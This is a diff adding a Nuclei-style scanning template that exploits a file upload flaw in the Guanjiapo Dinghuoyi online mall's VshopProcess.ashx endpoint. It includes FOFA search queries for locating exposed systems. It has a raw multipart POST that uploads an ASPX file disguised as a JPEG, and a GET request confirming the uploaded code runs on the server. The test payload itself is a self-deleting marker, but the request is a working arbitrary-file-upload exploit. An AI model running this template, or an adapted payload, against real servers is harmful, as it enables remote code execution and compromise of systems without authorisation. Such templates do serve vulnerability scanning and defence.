@@ -1,0 +1,45 @@
+id: gjpxg-file-upload
+
+info:
+  name: "管家婆订货易在线商城 VshopProcess.ashx 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="订货易"||title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"
+
+    管家婆订货易系统通过VshopProcess.ashx接口实现在线商城功能，该组件存在文件上传路径验证缺陷。攻击者可构造恶意请求向/Storage/UserFileImg/目录写入任意文件，导致服务器端代码执行或敏感数据泄露。系统宣称支持多平台订货整合及分销渠道管理，但未对上传文件类型和存储路径进行有效校验。
+
+    /Storage/UserFileImg/xxx.aspx
+
+  tags: 管家婆订货易
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+    - |
+      POST /API/VshopProcess.ashx?action=PostFileImg HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip
+      Connection: close
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+      Content-Disposition: form-data; name="fileup1i"; filename="NTest.aspx"
+      Content-Type: image/jpeg
+
+      <%@ Page Language="C#"%><% Response.Write("NdayTest");System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5--
+  - raw:
+    - |
+      GET /API/NTest.aspx HTTP/1.1
+      Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+    - type: status
+      status: [200]
+    - type: word
+      part: body
+      words:
+      - 'NdayTest'
